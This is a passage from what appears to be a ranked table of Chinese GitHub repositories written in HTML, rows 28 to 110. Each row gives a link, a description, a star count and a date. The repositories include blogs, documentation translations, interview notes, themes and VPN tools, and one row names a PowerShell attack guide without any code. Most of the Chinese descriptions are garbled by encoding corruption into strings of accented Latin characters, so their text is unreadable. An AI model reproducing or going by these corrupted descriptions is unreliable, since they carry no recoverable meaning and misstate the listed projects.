|28|[eddycjy/blog](https://github.com/eddycjy/blog)|ÁÖéÈ±ºÁöÑÂçöÂÆ¢ÔºåÊúâÁÇπÂøôÔºå‰º†ÈÄÅÈó®Ôºöhttps://eddycjy.com|2.5k|HTML|10/28|
|29|[cytle/wechat_web_devtools](https://github.com/cytle/wechat_web_devtools)|ÂæÆ‰ø°ÂºÄÂèëËÄÖÂ∑•ÂÖ∑(ÂæÆ‰ø°Â∞èÁ®ãÂ∫è)linuxÂÆåÁæéÊîØÊåÅ|2.5k|HTML|09/14|
|30|[sprov065/v2-ui](https://github.com/sprov065/v2-ui)|ÊîØÊåÅÂ§öÂçèËÆÆÂ§öÁî®Êà∑ÁöÑ v2ray Èù¢ÊùøÔºåSupport multi-protocol multi-user v2ray panel|2.5k|HTML|10/20|
|31|[refscn/rplibs](https://github.com/refscn/rplibs)|Refs.cn ÂéüÂûãËÆæËÆ°ÂÖÉ‰ª∂Â∫ìÔºåÂü∫‰∫éAxure RP 9/8ÔºåÊîØÊåÅ Android„ÄÅApple„ÄÅWindows„ÄÅÂæÆ‰ø°ÔºåÁßªÂä®„ÄÅÊ°åÈù¢Âπ≥Âè∞ÁöÑÂ∫îÁî®ÂíåÁΩëÁ´ôÂéüÂûãËÆæËÆ°„ÄÇ  ‰∏âÂπ¥ÂéÜÁ®ã 2k starÔºåÊÑüË∞¢Â§ßÂÆ∂‰ΩøÁî®„ÄÇ|2.2k|HTML|09/03|
|32|[anbang/javascript-notes](https://github.com/anbang/javascript-notes)|Êú±ÂÆâÈÇ¶ÁöÑ JavaScript Â≠¶‰π†Á¨îËÆ∞ÔºõJavaScriptÂ≠¶‰π†ÊÄªÁªìÔºõÂâçÁ´ØÂèòÂåñÂ§™Âø´ÔºåÂè™ÊúâÊääJSÂü∫Á°ÄÊâìÊâéÂÆû‰∫ÜÔºåÊâçËÉΩÊ∏∏ÂàÉÊúâ‰ΩôÔºõ‰∏∫‰∫ÜËÆ©ÊàëÁöÑJavaScriptÂü∫Á°ÄÂºÇÂ∏∏Áâ¢Âõ∫ÔºåÊÄùË∑ØÊõ¥Âä†Ê∏ÖÊô∞ÔºåÊàë‰ºöÊää‰ª•ÂâçÊÄªÁªìËøáÁöÑÁü•ËØÜÂíåÂπ≥Êó∂ÁúãÂà∞ÁöÑËµÑÊñôÊîæÂú®ËøôÈáåÔºåÊää‰ª•ÂâçÈõ∂Èõ∂Êï£Êï£ÁöÑÁü•ËØÜÁÇπÂÖ®ÈÉ®‰∏≤Ëµ∑Êù•ÔºÅËøô‰∏™È°πÁõÆ‰πüËÆ∏ÂÜôÂà∞ÊúÄÂêé‰ºöÊòØ‰∏Ä‰∏™ÈùûÂ∏∏‰∏çÈîôÁöÑJavaScriptÊïôÁ®ãÔºåÂ∏åÊúõÂèØ‰ª•Â∏ÆÂà∞Êõ¥Â§öÁöÑ‰∫∫ÔºõÊî∂ËóèËØ∑ÁÇπstarÔºõÂ¶ÇÊûúÂèëÁé∞ÊàëÊúâÂÜôÈîôËØØÁöÑÔºåÊ¨¢ËøéÈöèÊó∂Â∏ÆÊàëÊîπÊ≠£ÔºåÊàñËÄÖÂ¢ûÂä†Êñ∞ÁöÑËßÇÁÇπÔºåË∞¢Ë∞¢ÔºÅ|1.9k|HTML|03/08|
|33|[phodal/fe](https://github.com/phodal/fe)|„ÄäÊàëÁöÑËÅå‰∏öÊòØÂâçÁ´ØÂ∑•Á®ãÂ∏à„Äã - EbookÔºöI'm a FrontEnd Developer|1.9k|HTML|09/16|
|34|[phodal/designiot](https://github.com/phodal/designiot)|Êïô‰Ω†ËÆæËÆ°Áâ©ËÅîÁΩëÁ≥ªÁªü„ÄÇÊûÑÂª∫Ëá™Â∑±ÁöÑInternet of Things „ÄÇ|1.8k|HTML|08/11|
|35|[fluid-dev/hexo-theme-fluid](https://github.com/fluid-dev/hexo-theme-fluid)|:ocean: ‰∏ÄÊ¨æ Material Design È£éÊ†ºÁöÑ Hexo ‰∏ªÈ¢ò / An elegant Material-Design theme for Hexo|1.8k|HTML|10/29|
|36|[riku/Markdown-Syntax-CN](https://github.com/riku/Markdown-Syntax-CN)|Markdown ËØ≠Ê≥ïÁÆÄ‰Ωì‰∏≠ÊñáÁâàÔºàfork ‰∫éÁπÅ‰Ωì‰∏≠ÊñáÁâà http://markdown.tw/ Ôºâ|1.8k|HTML|07/07|
|37|[gwuhaolin/blog](https://github.com/gwuhaolin/blog)|Êµ©È∫üÁöÑÊäÄÊúØÂçöÂÆ¢|1.7k|HTML|08/20|
|38|[sinaweibosdk/weibo_android_sdk](https://github.com/sinaweibosdk/weibo_android_sdk)|Êñ∞Êµ™ÂæÆÂçö Android SDK|1.7k|HTML|09/02|
|39|[HiddenStrawberry/Crawler_Illegal_Cases_In_China](https://github.com/HiddenStrawberry/Crawler_Illegal_Cases_In_China)|Collection of China illegal cases about web crawler Êú¨È°πÁõÆÁî®Êù•Êï¥ÁêÜÊâÄÊúâ‰∏≠ÂõΩÂ§ßÈôÜÁà¨Ëô´ÂºÄÂèëËÄÖÊ∂âËØâ‰∏éËøùËßÑÁõ∏ÂÖ≥ÁöÑÊñ∞Èóª„ÄÅËµÑÊñô‰∏éÊ≥ïÂæãÊ≥ïËßÑ„ÄÇËá¥Âäõ‰∫éÂ∏ÆÂä©Âú®‰∏≠ÂõΩÂ§ßÈôÜÂ∑•‰ΩúÁöÑÁà¨Ëô´Ë°å‰∏ö‰ªé‰∏öËÄÖ‰∫ÜËß£ÊàëÂõΩÁõ∏ÂÖ≥Ê≥ïÂæãÔºåÈÅøÂÖçËß¶Á¢∞Êï∞ÊçÆÂêàËßÑÁ∫¢Á∫ø„ÄÇ [AD]‰∏≠ÊñáÁü•ËØÜÂõæË∞±Èó®Êà∑ |1.6k|HTML|09/27|
|40|[EvilCult/iptv-m3u-maker](https://github.com/EvilCult/iptv-m3u-maker)|IPTV ÂõΩÂÜÖ+ÂõΩÂ§ñ ÁîµËßÜÂè∞Áõ¥Êí≠Ê∫êm3uÊñá‰ª∂, Êî∂ÈõÜ&Ê±áÊÄª&Êú¨Âú∞Ê∫êËÑöÊú¨|1.6k|HTML|09/30|
|41|[kujian/frontendDaily](https://github.com/kujian/frontendDaily)|ÂâçÁ´ØÂºÄÂèëÊäÄÊúØÊó•Êä•ÔºåÊØèÊó•ÂàÜ‰∫´‰∫íËÅîÁΩëÊúÄÁ≤æÂΩ©ÁöÑÂâçÁ´ØÊäÄÊúØ„ÄÅÂâçÁ´ØËµÑËÆØ„ÄÅÂêéÁ´ØÁºñÁ®ã„ÄÅËÆæËÆ°ÂíåËµÑÊ∫êÁ≠âÔºåÊ¨¢ËøéÂÖ≥Ê≥®Watch|1.6k|HTML|09/10|
|42|[ccforward/cc](https://github.com/ccforward/cc)|‰ª£Á†ÅÂ∫ì & Blog|1.6k|HTML|10/09|
|43|[demopark/electron-api-demos-Zh_CN](https://github.com/demopark/electron-api-demos-Zh_CN)|ËøôÊòØ electron-api-demos ÁöÑ‰∏≠ÊñáÁâàÊú¨, Êõ¥Êñ∞Ëá≥ v2.0.2|1.5k|HTML|09/11|
|44|[F4bwDP6a6W/FLY_US](https://github.com/F4bwDP6a6W/FLY_US)|ÁæéÂõΩÂ§ßÂ≠¶Â§áËÄÉËµÑÊñô How to apply US colleges|1.5k|HTML|05/03|
|45|[qiwihui/hiwifi-ss](https://github.com/qiwihui/hiwifi-ss)|ÊûÅË∑ØÁî±+ssÈÖçÁΩÆ|1.5k|HTML|05/13|
|46|[biaochenxuying/blog](https://github.com/biaochenxuying/blog)|Â§ßÂâçÁ´ØÊäÄÊúØ‰∏∫‰∏ªÔºåËØª‰π¶Á¨îËÆ∞„ÄÅÈöèÁ¨î„ÄÅÁêÜË¥¢‰∏∫ËæÖÔºåÂÅö‰∏™ÁªàË∫´Â≠¶‰π†ËÄÖ„ÄÇ|1.5k|HTML|10/08|
|47|[phodal/serverless](https://github.com/phodal/serverless)|Serverless Êû∂ÊûÑÂ∫îÁî®ÂºÄÂèëÊåáÂçó - Serverless Architecture Application Development Guide with Serverless Framework.|1.5k|HTML|07/17|
|48|[huyaocode/webKnowledge](https://github.com/huyaocode/webKnowledge)|ÂâçÁ´ØÈù¢ËØïÁü•ËØÜÁÇπÊÄªÁªì|1.4k|HTML|10/25|
|49|[sinaweibosdk/weibo_ios_sdk](https://github.com/sinaweibosdk/weibo_ios_sdk)|Êñ∞Êµ™ÂæÆÂçö IOS SDK|1.4k|HTML|10/16|
|50|[golang101/golang101](https://github.com/golang101/golang101)|GoËØ≠Ë®Ä101 : ‰∏ÄÊú¨‰æßÈáç‰∫éGoËØ≠Ë®ÄËØ≠Ê≥ïÂíåËØ≠‰πâÁöÑÁºñÁ®ãËß£ÈáäÂíåÊåáÂØº‰π¶|1.4k|HTML|10/28|
|51|[jeanboydev/Android-ReadTheFuckingSourceCode](https://github.com/jeanboydev/Android-ReadTheFuckingSourceCode)|üòú ËÆ∞ÂΩïÊó•Â∏∏ÁöÑÂºÄÂèëÊäÄÂ∑ßÔºåÂºÄÂèë‰∏≠ÈÅáÂà∞ÁöÑÊäÄÊúØÈáçÁÇπ„ÄÅÈöæÁÇπÔºåÂêÑ‰∏™Áü•ËØÜÁÇπÁöÑÊÄªÁªìÔºå‰ºòË¥®Èù¢ËØïÈ¢òÁ≠âÁ≠â„ÄÇÊåÅÁª≠Êõ¥Êñ∞...|1.4k|HTML|10/09|
|52|[Muyangmin/glide-docs-cn](https://github.com/Muyangmin/glide-docs-cn)|GlideÁÆÄ‰Ωì‰∏≠ÊñáÊñáÊ°£Á´ôÁÇπÊâòÁÆ°È°πÁõÆ„ÄÇ|1.4k|HTML|07/20|
|53|[cxinping/PyQt5](https://github.com/cxinping/PyQt5)|„ÄäPyQt5Âø´ÈÄüÂºÄÂèë‰∏éÂÆûÊàò„ÄãÈÖçÂ•ó‰ª£Á†Å|1.3k|HTML|03/12|
|54|[xswei/d3js_doc](https://github.com/xswei/d3js_doc)|D3js‰∏≠ÊñáÊñáÊ°£  D3‰∏≠Êñá :bar_chart: :chart_with_upwards_trend: :tada:|1.3k|HTML|10/10|
|55|[Thinkgamer/books](https://github.com/Thinkgamer/books)|ÊäÄÊúØËµÑÊñôÂàÜ‰∫´|1.3k|HTML|05/20|
|56|[chokcoco/magicCss](https://github.com/chokcoco/magicCss)|CSS3Â•áÊÄùÂ¶ôÊÉ≥ÔºåÂçïÊ†áÁ≠æÂÆûÁé∞ÂêÑÁ±ªÂõæÂΩ¢|1.2k|HTML|02/08|
|57|[esofar/cnblogs-theme-silence](https://github.com/esofar/cnblogs-theme-silence)|üìñ ‰∏ÄÊ¨æ‰∏ìÊ≥®‰∫éÈòÖËØªÁöÑÂçöÂÆ¢Âõ≠‰∏ªÈ¢ò|1.2k|HTML|10/29|
|58|[monlor/MIXBOX-ARCHIVE](https://github.com/monlor/MIXBOX-ARCHIVE)|‰∏ÄÊ¨æÂü∫‰∫éShellÁöÑÂ∞èÁ±≥Ë∑ØÁî±Âô®Â∑•ÂÖ∑ÁÆ±ÔºåÂéü‰∏∫Monlor-ToolsÔºåA tool box for XiaoMi Router base on Shell.|1.2k|HTML|09/17|
|59|[joeyguo/blog](https://github.com/joeyguo/blog)|joeyguo's blog  ËØ∑ Watch Êàñ Star|1.2k|HTML|09/02|
|60|[yangkun19921001/Blog](https://github.com/yangkun19921001/Blog)|Android Èù¢ËØïÂÆùÂÖ∏„ÄÅÊï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ï„ÄÅÈü≥ËßÜÈ¢ë (FFmpeg„ÄÅAAC„ÄÅx264„ÄÅMediaCodec)„ÄÅ C/C++ „ÄÅOpenCV„ÄÅË∑®Âπ≥Âè∞Á≠âÂ≠¶‰π†ËÆ∞ÂΩï„ÄÇ„Äê0Âü∫Á°ÄÈü≥ËßÜÈ¢ëËøõÈò∂Â≠¶‰π†Ë∑ØÁ∫ø„Äë|1.1k|HTML|09/22|
|61|[wx-chevalier/Awesome-CS-Books-and-Digests](https://github.com/wx-chevalier/Awesome-CS-Books-and-Digests)|:books: Awesome CS Books(with Digests)/Series(.pdf by git lfs) Warehouse for Geeks, ProgrammingLanguage, SoftwareEngineering, Web, AI, ServerSideApplication, Infrastructure, FE etc. :dizzy: ‰ºòÁßÄËÆ°ÁÆóÊú∫ÁßëÂ≠¶‰∏éÊäÄÊúØÈ¢ÜÂüüÁõ∏ÂÖ≥ÁöÑ‰π¶Á±çÂΩíÊ°£Ôºå‰ª•ÂèäÊàëÁöÑËØª‰π¶Á¨îËÆ∞„ÄÇ|1.1k|HTML|10/28|
|62|[shengxinjing/my_blog](https://github.com/shengxinjing/my_blog)|:snail:ÂÜô‰∏ÄÁÇπÂçöÂÆ¢Ôºåpython web ÂâçÁ´Ø ËøêÁª¥|1.1k|HTML|09/27|
|63|[sglfree/freesky](https://github.com/sglfree/freesky)|Ëá™Áî±Èó®ÊúÄÊñ∞7.90Áâà Êó†Áïå19.02Ê≠£ÂºèÁâà‰∏ãËΩΩ Ëá™Áî±Èó® Êó†Áïå Êó†ÁïåÊµèËßà Ëã±ÊñáÁâà ÁøªÂ¢ôËΩØ‰ª∂ ÁøªÂ¢ôÂ∑•ÂÖ∑ ‰∏ãËΩΩ ÁøªÂ¢ôËΩØ‰ª∂ÊïôÁ®ã MacÁøªÂ¢ôËΩØ‰ª∂ Ëá™Áî±Èó®‰ΩøÁî®ÊïôÁ®ã--Ëá™Áî±Â§©Á©∫|1.1k|HTML|10/29|
|64|[mzlogin/mzlogin.github.io](https://github.com/mzlogin/mzlogin.github.io)|Jekyll Themes / GitHub Pages ÂçöÂÆ¢Ê®°Êùø / A template repository for Jekyll based blog|990|HTML|10/29|
|65|[iwestlin/gd-utils](https://github.com/iwestlin/gd-utils)|Google Drive ÁôæÂÆùÁÆ±|985|HTML|10/14|
|66|[wx-chevalier/DistributedSystem-Series](https://github.com/wx-chevalier/DistributedSystem-Series)|:books: Ê∑±ÂÖ•ÊµÖÂá∫ÂàÜÂ∏ÉÂºèÂü∫Á°ÄÊû∂ÊûÑÔºåLinux ‰∏éÊìç‰ΩúÁ≥ªÁªüÁØá   ÂàÜÂ∏ÉÂºèÁ≥ªÁªüÁØá   ÂàÜÂ∏ÉÂºèËÆ°ÁÆóÁØá   Êï∞ÊçÆÂ∫ìÁØá   ÁΩëÁªúÁØá   ËôöÊãüÂåñ‰∏éÁºñÊéíÁØá   Â§ßÊï∞ÊçÆ‰∏é‰∫ëËÆ°ÁÆóÁØá|978|HTML|10/28|
|67|[liulangnan/aui](https://github.com/liulangnan/aui)|ÁßªÂä®Á´ØUIÂø´ÈÄüÂ∏ÉÂ±ÄËß£ÂÜ≥ÊñπÊ°àÔºå‰∏Ä‰∏™Èù†Ë∞±ÁöÑÈ´òÊÄßËÉΩÁßªÂä®ÂâçÁ´ØÊ°ÜÊû∂|968|HTML|08/22|
|68|[doocs/coding-interview](https://github.com/doocs/coding-interview)|üòÄ ‰ª£Á†ÅÈù¢ËØïÈ¢òÈõÜÔºåÂåÖÊã¨ÂâëÊåá Offer„ÄÅÁºñÁ®ã‰πãÁæéÁ≠â|930|HTML|10/20|
|69|[SangKa/MobX-Docs-CN](https://github.com/SangKa/MobX-Docs-CN)|MobX ‰∏≠ÊñáÊñáÊ°£|916|HTML|09/12|
|70|[tencentyun/qcloud-documents](https://github.com/tencentyun/qcloud-documents)|ËÖæËÆØ‰∫ëÂÆòÊñπÊñáÊ°£|898|HTML|10/30|
|71|[HelloGitHub-Team/Article](https://github.com/HelloGitHub-Team/Article)|ËÆ≤Ëß£ÂºÄÊ∫êÈ°πÁõÆÁ≥ªÂàóÊñáÁ´†Â∫ì|833|HTML|10/26|
|72|[sanyuan0704/my_blog](https://github.com/sanyuan0704/my_blog)|Á•û‰∏âÂÖÉÁöÑÂçöÂÆ¢Ôºå‰∏ÄËµ∑ÊûÑÂª∫ÂÆåÊï¥Áü•ËØÜ‰ΩìÁ≥ª|831|HTML|08/20|
|73|[netkiller/netkiller.github.io](https://github.com/netkiller/netkiller.github.io)|Netkiller Free ebook - ÂÖçË¥πÁîµÂ≠ê‰π¶|818|HTML|10/28|
|74|[wzy6642/Machine-Learning-in-Action-Python3](https://github.com/wzy6642/Machine-Learning-in-Action-Python3)|„ÄäÊú∫Âô®Â≠¶‰π†ÂÆûÊàò„Äãpython3Ê∫êÁ†Å|814|HTML|08/02|
|75|[kenzok8/openwrt-packages](https://github.com/kenzok8/openwrt-packages)|openwetÂ∏∏Áî®ËΩØ‰ª∂ÂåÖ|803|HTML|10/29|
|76|[iv-web/ppts](https://github.com/iv-web/ppts)|Âõ¢ÈòüÂØπÂ§ñÂàÜ‰∫´ppt|793|HTML|10/20|
|77|[SolidZORO/zpix-pixel-font](https://github.com/SolidZORO/zpix-pixel-font)|Zpix (ÊúÄÂÉèÁ¥†) is a pixel font supporting English, Traditional Chinese, Simplified Chinese and Japanese.|767|HTML|10/09|
|78|[vpncn/vpncn.github.io](https://github.com/vpncn/vpncn.github.io)|2020‰∏≠ÂõΩÁøªÂ¢ôËΩØ‰ª∂VPNÊé®ËçêÊåáÂçóÔºå‰ª•ÂèäÂØπÊØîVPSËá™Âª∫„ÄÅSSRÊú∫Âú∫„ÄÅËìùÁÅØ„ÄÅWireGuard„ÄÅV2ray„ÄÅËÄÅÁéãVPNÁ≠âÁßëÂ≠¶‰∏äÁΩëËΩØ‰ª∂‰∏éÁøªÂ¢ôÊñπÊ≥ïÁöÑ‰ºòÁº∫ÁÇπÔºå‰∏≠ÂõΩÊúÄÊñ∞ÁßëÂ≠¶‰∏äÁΩëÁøªÂ¢ôVPNÊ¢ØÂ≠êÊé®ËçêÔºåÁ®≥ÂÆöÂ•ΩÁî®„ÄÇ|756|HTML|10/29|
|79|[godbasin/godbasin.github.io](https://github.com/godbasin/godbasin.github.io)|Ë¢´Âà†ÂâçÁ´ØÂçöÂÆ¢--ÂñúÊ¨¢ËØ∑star|755|HTML|10/10|
|80|[TransparentLC/WechatMomentScreenshot](https://github.com/TransparentLC/WechatMomentScreenshot)|ÊúãÂèãÂúàËΩ¨ÂèëÊà™ÂõæÁîüÊàêÂ∑•ÂÖ∑|747|HTML|09/26|
|81|[FoXZilla/Pxer](https://github.com/FoXZilla/Pxer)|A tool for pixiv.net. ‰∫∫‰∫∫ÂèØÁî®ÁöÑPÁ´ôÁà¨Ëô´|718|HTML|09/04|
|82|[othree/markdown-syntax-zhtw](https://github.com/othree/markdown-syntax-zhtw)|Markdown Ë™ûÊ≥ïË™™Êòé‰∏≠ÊñáÁâà|708|HTML|08/14|
|83|[helloxz/ccaa](https://github.com/helloxz/ccaa)|Linux‰∏ÄÈîÆÂÆâË£ÖAria2 + AriaNg + FileBrowseÂÆûÁé∞Á¶ªÁ∫ø‰∏ãËΩΩ„ÄÅÊñá‰ª∂ÁÆ°ÁêÜ„ÄÇ|684|HTML|05/01|
|84|[lzjun567/python_scripts](https://github.com/lzjun567/python_scripts)|‰∏Ä‰∫õpythonÁõ∏ÂÖ≥ÁöÑÊºîÁ§∫‰ª£Á†Å|679|HTML|06/01|
|85|[typlog/china-indie-podcasts](https://github.com/typlog/china-indie-podcasts)|ÂèëÁé∞‰∏éÊé®ËçêÈ´òË¥®ÈáèÁöÑ‰∏≠ÊñáÁã¨Á´ãÊí≠ÂÆ¢|672|HTML|10/30|
|86|[wx-chevalier/ProgrammingLanguage-Series](https://github.com/wx-chevalier/ProgrammingLanguage-Series)|:books: ÁºñÁ®ãËØ≠Ë®ÄËØ≠Ê≥ïÂü∫Á°Ä‰∏éÂ∑•Á®ãÂÆûË∑µÔºåJavaScript   Java   Python   Go   Rust   CPP   Swift|634|HTML|10/28|
|87|[yangzongzhuan/RuoYi](https://github.com/yangzongzhuan/RuoYi)|(RuoYi)ÂÆòÊñπ‰ªìÂ∫ì Âü∫‰∫éSpringBootÁöÑÊùÉÈôêÁÆ°ÁêÜÁ≥ªÁªü ÊòìËØªÊòìÊáÇ„ÄÅÁïåÈù¢ÁÆÄÊ¥ÅÁæéËßÇ„ÄÇ Ê†∏ÂøÉÊäÄÊúØÈááÁî®Spring„ÄÅMyBatis„ÄÅShiroÊ≤°Êúâ‰ªª‰ΩïÂÖ∂ÂÆÉÈáçÂ∫¶‰æùËµñ„ÄÇÁõ¥Êé•ËøêË°åÂç≥ÂèØÁî®|630|HTML|10/22|
|88|[feiyu563/PrometheusAlert](https://github.com/feiyu563/PrometheusAlert)|Prometheus AlertÊòØÂºÄÊ∫êÁöÑËøêÁª¥ÂëäË≠¶‰∏≠ÂøÉÊ∂àÊÅØËΩ¨ÂèëÁ≥ªÁªü,ÊîØÊåÅ‰∏ªÊµÅÁöÑÁõëÊéßÁ≥ªÁªüPrometheus,Zabbix,Êó•ÂøóÁ≥ªÁªüGraylogÂíåÊï∞ÊçÆÂèØËßÜÂåñÁ≥ªÁªüGrafanaÂèëÂá∫ÁöÑÈ¢ÑË≠¶Ê∂àÊÅØ,ÊîØÊåÅÈíâÈíâ,ÂæÆ‰ø°,Âçé‰∏∫‰∫ëÁü≠‰ø°,ËÖæËÆØ‰∫ëÁü≠‰ø°,ËÖæËÆØ‰∫ëÁîµËØù,ÈòøÈáå‰∫ëÁü≠‰ø°,ÈòøÈáå‰∫ëÁîµËØùÁ≠â|577|HTML|10/10|
|89|[pengchujin/v2rayDocker](https://github.com/pengchujin/v2rayDocker)|‰∏ÄÈîÆv2ray ws + tls Êñπ‰æøÂ∞±ÂÆå‰∫ã‰∫Ü|573|HTML|10/12|
|90|[FrontEndRoad/HTML5-FAQ](https://github.com/FrontEndRoad/HTML5-FAQ)|H5È°πÁõÆÂ∏∏ËßÅÈóÆÈ¢òÊ±áÊÄªÂèäËß£ÂÜ≥ÊñπÊ°à|569|HTML|10/02|
|91|[flyingalex/design-patterns-by-php](https://github.com/flyingalex/design-patterns-by-php)|„ÄäÂ§ßËØùËÆæËÆ°Ê®°Âºè„ÄãphpÁâàÊú¨, https://design-patterns-by-php.hulin.ink|561|HTML|10/06|
|92|[justjavac/justjavac.github.com](https://github.com/justjavac/justjavac.github.com)|‰∏™‰∫∫ÂçöÂÆ¢ÔºåÂñúÊ¨¢ÁöÑËØùËØ∑ÁÇπ starÔºåÊÉ≥ËÆ¢ÈòÖÁÇπ watch :sparkles: |555|HTML|03/26|
|93|[pingan8787/Leo-JavaScript](https://github.com/pingan8787/Leo-JavaScript)|ËøôÈáåÊòØÊàëËá™Â∑±ÂØπ JavaScript Â≠¶‰π†ËµÑÊñôÁöÑÊï¥ÁêÜÔºåÂåÖÊã¨„ÄäCute-JavaScript„Äã„ÄÅÊ°ÜÊû∂„ÄÅHTTP„ÄÅGraphQL„ÄÅTS„ÄÅWebpackÁ≠âÔºåËøòÊúâÂæàÂ§ödemoÂíåÊñáÁ´†Ôºå‰πüÊòØ‰Ωú‰∏∫Ëá™Â∑±Â≠¶‰π†ÁªìÊûúÁöÑËæìÂá∫ÔºåÂñúÊ¨¢ÁöÑÊúãÂèãÊ¨¢Ëøéstat„ÄÇ:rocket:ÊåÅÁª≠Êõ¥Êñ∞‰∏≠...|542|HTML|10/25|
|94|[YMFE/ydoc](https://github.com/YMFE/ydoc)|üê∂YDoc ÊòØ‰∏Ä‰∏™Êõ¥ÊáÇ‰Ω†ÁöÑÊñáÊ°£Á´ôÊûÑÂª∫Â∑•ÂÖ∑ÔºåÂü∫‰∫é markdown ËΩªÊùæÁîüÊàêÂÆåÊï¥ÈùôÊÄÅÁ´ôÁÇπ|526|HTML|05/28|
|95|[wx-chevalier/SoftwareEngineering-Series](https://github.com/wx-chevalier/SoftwareEngineering-Series)|:books: ËΩØ‰ª∂Â∑•Á®ã„ÄÅÁÆóÊ≥ï‰∏éÊû∂ÊûÑÔºöÊï∞ÊçÆÁªìÊûÑ‰∏éÁÆóÊ≥ï„ÄÅËÆæËÆ°Ê®°Âºè„ÄÅËΩØ‰ª∂Êû∂ÊûÑ„ÄÅÂçèÂêåÂºÄÂèë„ÄÅË¥®Èáè‰øùÈöú QA|522|HTML|10/22|
|96|[Coq-zh/SF-zh](https://github.com/Coq-zh/SF-zh)|„ÄäËΩØ‰ª∂Âü∫Á°Ä„Äã‰∏≠ËØëÁâà Software Foundations Chinese Translation|522|HTML|09/03|
|97|[rootclay/Powershell-Attack-Guide](https://github.com/rootclay/Powershell-Attack-Guide)|PowershellÊîªÂáªÊåáÂçó----ÈªëÂÆ¢ÂêéÊ∏óÈÄè‰πãÈÅì|512|HTML|07/10|
|98|[twang281314/frontEnd](https://github.com/twang281314/frontEnd)|ÂâçÁ´ØÁõ∏ÂÖ≥|505|HTML|10/15|
|99|[isee15/Lunar-Solar-Calendar-Converter](https://github.com/isee15/Lunar-Solar-Calendar-Converter)|ÂÖ¨ÂéÜ(Èò≥ÂéÜ) ÂÜúÂéÜ(Èò¥ÂéÜ)ËΩ¨Êç¢ÔºåÊîØÊåÅÊó∂Èó¥ÊÆµ‰ªé1900-2100 Â¶ÇÊûúÈúÄË¶ÅÊõ¥ÈïøÁöÑÊó∂Èó¥ÊÆµÔºåÂà©Áî®generate.htmÁîüÊàêÁöÑÊï∞ÊçÆÂç≥ÂèØ„ÄÇ ÊîØÊåÅÂêÑÁßçÁºñÁ®ãËØ≠Ë®Ä C#,java,Objective-C,php,Python,javascript(nodejs),C/C++,ruby,swift,golangÁ≠â ÊîØÊåÅMacÔºåWindowsÔºåAndroidÔºåWPÂ§öÁßçÂπ≥Âè∞|499|HTML|10/12|
|100|[koala-coding/goodBlog](https://github.com/koala-coding/goodBlog)|ÊàëÊòØkoala, ÂÖ¨‰ºóÂè∑„ÄêÁ®ãÂ∫èÂëòÊàêÈïøÊåáÂåó„ÄëÁöÑ‰ΩúËÄÖÔºå ‰∏ìÊ≥®Node.jsÊäÄÊúØÊ†àÂàÜ‰∫´Ôºå‰ªéÂâçÁ´ØÂà∞Node.jsÂÜçÂà∞ÂêéÁ´ØÊï∞ÊçÆÂ∫ìÔºåÂ∏ÆÊÇ®Êàê‰∏∫‰ºòÁßÄÁöÑNode.jsÂÖ®Ê†àÂ∑•Á®ãÂ∏à„ÄÇÂíåÊàë‰∏ÄËµ∑ËøõÈò∂ÂÖ®Ê†àÂêßÔºÅ|496|HTML|09/12|
|101|[kgco/RateMySupervisor](https://github.com/kgco/RateMySupervisor)|Ê∞∏‰πÖÂÖçË¥πÂºÄÊ∫êÁöÑÂØºÂ∏àËØÑ‰ª∑Êï∞ÊçÆ„ÄÅÊï∞ÊçÆÁà¨Ëô´„ÄÅÊó†ÈúÄÁºñÁ®ãÂü∫Á°ÄÁöÑÂ±ïÁ§∫ÁΩëÈ°µ‰ª•ÂèäÊñ∞‰ø°ÊÅØË°•ÂÖÖÂπ≥Âè∞|495|HTML|09/16|
|102|[wx-chevalier/Awesome-Lists](https://github.com/wx-chevalier/Awesome-Lists)|:books: Guide to Galaxy, curated, worthy and up-to-date links/reading list for ITCS-Coding/Algorithm/SoftwareArchitecture/AI.  :dizzy: ITCS-ÁºñÁ®ã/ÁÆóÊ≥ï/ËΩØ‰ª∂Êû∂ÊûÑ/‰∫∫Â∑•Êô∫ËÉΩÁ≠âÈ¢ÜÂüüÁöÑÊñáÁ´†/‰π¶Á±ç/ËµÑÊñô/È°πÁõÆÈìæÊé•Á≤æÈÄâÔºåÂ≤ÅÊúàÊ≤âÊ∑ÄÁöÑÁæéÂ•Ω|491|HTML|10/29|
|103|[tanjiti/sec_profile](https://github.com/tanjiti/sec_profile)|Áà¨ÂèñsecwikiÂíåxuanwu.github.io/sec.today,ÂàÜÊûêÂÆâÂÖ®‰ø°ÊÅØÁ´ôÁÇπ„ÄÅÂÆâÂÖ®Ë∂ãÂäø„ÄÅÊèêÂèñÂÆâÂÖ®Â∑•‰ΩúËÄÖË¥¶Âè∑(twitter,weixin,githubÁ≠â)|479|HTML|10/29|
|104|[ningbonb/HTML5](https://github.com/ningbonb/HTML5)|HTML5Â≠¶‰π†„ÄÅÊÄªÁªì„ÄÅÂÆûË∑µ|474|HTML|07/01|
|105|[hornhuang/android_interviews](https://github.com/hornhuang/android_interviews)|üöÄEverything you need to know to find a android job. ÁÆóÊ≥ï / Èù¢ËØïÈ¢ò / Android Áü•ËØÜÁÇπ üî•üî•üî• ÊÄªÁªì‰∏çÊòìÔºå‰Ω†ÁöÑ star ÊòØÊàëÊúÄÂ§ßÁöÑÂä®ÂäõÔºÅ|473|HTML|04/11|
|106|[Homiss/Java-interview-questions](https://github.com/Homiss/Java-interview-questions)|üå±‰∏çÂÆöÊúüÊî∂ÈõÜÊï¥ÁêÜJavaÁõ∏ÂÖ≥Èù¢ËØïÈ¢ò|471|HTML|10/02|
|107|[raytaylorlin/hexo-theme-raytaylorism](https://github.com/raytaylorlin/hexo-theme-raytaylorism)|‰∏ÄÊ¨æMaterial DesignÈ£éÊ†ºÁöÑhexo‰∏ªÈ¢ò|464|HTML|04/07|
|108|[lyy289065406/re0-web](https://github.com/lyy289065406/re0-web)|Re0Ôºö‰ªéÈõ∂ÂºÄÂßãÁöÑÂºÇ‰∏ñÁïåÁîüÊ¥ª ÔºàWEBÁâàÔºâ|462|HTML|10/15|
|109|[xiaolai/blockchainlittlebook.com](https://github.com/xiaolai/blockchainlittlebook.com)|Âå∫ÂùóÈìæÂ∞èÁôΩ‰π¶|461|HTML|10/13|
|110|[ssy341/datatables-cn](https://github.com/ssy341/datatables-cn)|Datatables‚Äî‚Äî jquery Êèí‰ª∂‰∏≠ÊñáÁΩë|457|HTML|10/09|
